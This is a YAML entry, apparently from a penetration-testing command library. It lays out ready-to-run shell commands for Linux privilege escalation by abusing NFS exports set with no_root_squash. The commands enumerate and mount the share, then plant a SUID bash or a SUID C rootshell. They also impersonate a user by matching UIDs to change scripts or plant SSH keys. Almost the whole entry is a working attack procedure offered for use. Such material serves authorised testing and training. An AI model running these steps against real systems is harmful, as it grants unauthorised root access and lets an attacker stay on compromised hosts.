---
description: |
  Exploit misconfigured NFS exports with no_root_squash to create SUID binaries and escalate privileges on the target.
commands:
  - have: Shell
    cmd: |
      # ============================================================
      # ENUMERATION — Discover NFS shares
      # ============================================================

      # Enumerate NFS shares from attacker (may need sudo)
      showmount -e 10.10.10.27
      sudo showmount -e 10.10.10.27

      # On the target, check exports config for no_root_squash
      cat /etc/exports

      # ============================================================
      # MOUNT — Mount the NFS share on attacker machine
      # ============================================================

      mkdir /tmp/nfs
      sudo mount -t nfs 10.10.10.27:/share /tmp/nfs

      # Verify the mount
      df -h /tmp/nfs
      ls -la /tmp/nfs

      # ============================================================
      # EXPLOIT 1: SUID bash (requires no_root_squash)
      # ============================================================

      # On attacker as root — copy bash and set SUID
      sudo cp /bin/bash /tmp/nfs/bash
      sudo chmod +s /tmp/nfs/bash
      sudo chmod +x /tmp/nfs/bash

      # On target as low-priv user — execute SUID bash
      /share/bash -p

      # ============================================================
      # EXPLOIT 2: SUID C binary (requires no_root_squash)
      # ============================================================

      # Compile on attacker:
      # int main() { setuid(0); setgid(0); system("/bin/bash -p"); }
      sudo gcc -o /tmp/nfs/rootshell /tmp/rootshell.c
      sudo chmod +s /tmp/nfs/rootshell

      # On target:
      /share/rootshell

      # ============================================================
      # EXPLOIT 3: UID matching (when root_squash is ON)
      # ============================================================

      # Check file ownership on the NFS share
      ls -lan /tmp/nfs

      # Create a local user with the matching UID
      sudo useradd -u 1001 tempuser
      su - tempuser

      # Now you have read/write access to files owned by UID 1001
      # Modify scripts, plant SSH keys, etc.

      # ============================================================
      # CLEANUP — Unmount when done
      # ============================================================

      sudo umount /tmp/nfs
phase:
  - PrivEsc
target_os:
  - Linux
services:
  - NFS
techniques:
  - NFS_Abuse
references:
  - https://book.hacktricks.xyz/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
---
